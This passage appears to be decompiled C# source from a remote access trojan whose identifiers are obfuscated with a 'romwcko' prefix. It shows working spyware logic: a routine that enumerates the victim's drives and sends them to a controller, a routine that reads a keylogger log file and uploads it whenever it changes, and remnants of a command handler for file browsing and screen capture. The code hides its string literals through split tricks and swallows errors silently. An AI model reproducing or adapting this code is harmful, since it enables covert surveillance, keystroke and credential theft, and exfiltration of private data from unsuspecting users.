							romwckoHD.romwckolookFiles(switchType[1]);
						};
						romwckofunThread = new Thread(romwckofunStarter);
						romwckofunThread.Start();
						break;
					}
					continue;
				}
				romwckois_working = false;
				break;
			}
			romwckois_working = false;
			romwckocapScreen = false;
		}
		romwckoiswitch = false;
	}

	private void romwckolistDrives()
	{
		string text = romwckoHD.romwckolookupDrives();
		romwckopush_data(null, "romwcko-dirs=!romwcko".Split(new char[1] { '!' })[0] + text);
	}

	private void romwckouploadKLogs(string typ)
	{
		try
		{
			if (!File.Exists(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs))
			{
				return;
			}
			string fileName = Path.GetFileName(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs);
			DateTime lastWriteTimeUtc = File.GetLastWriteTimeUtc(romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs);
			string text = "savky|romwcko".Split(new char[1] { '|' })[0];
			string path = romwckoCONF.romwckokiPath() + romwckoCONF.romwckokeloogs;
			byte[] bytes;
			using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using StreamReader streamReader = new StreamReader(stream);
				bytes = Encoding.ASCII.GetBytes(streamReader.ReadToEnd());
			}
			if (typ == text)
			{
				if (romwckolTimeUtc.ToString() != lastWriteTimeUtc.ToString() && bytes.Length > 0)
				{
					romwckopush_data(bytes, "romwcko-" + typ + "=!romwcko".Split(new char[1] { '!' })[0] + fileName);
				}
			}
			else if (bytes.Length > 0)
			{
				romwckopush_data(bytes, "romwcko-" + typ + "=|romwcko".Split(new char[1] { '|' })[0] + fileName);
			}
			romwckolTimeUtc = lastWriteTimeUtc;
		}
		catch
		{
		}
	}
}
